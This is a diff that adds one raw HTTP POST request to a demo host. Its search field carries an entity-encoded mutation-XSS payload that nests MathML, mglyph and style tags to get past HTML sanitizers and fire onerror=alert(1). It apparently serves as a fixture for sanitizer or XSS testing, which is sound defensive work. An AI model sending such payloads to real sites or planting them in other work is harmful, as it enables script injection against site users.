@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 158
+Connection: close
+
+search=&#x3C;math&#x3E;&#x3C;mtext&#x3E;&#x3C;table&#x3E;&#x3C;mglyph&#x3E;&#x3C;style&#x3E;&#x3C;!--&#x3C;/style&#x3E;&#x3C;img src=-- onerror=alert(1)&#x3E;
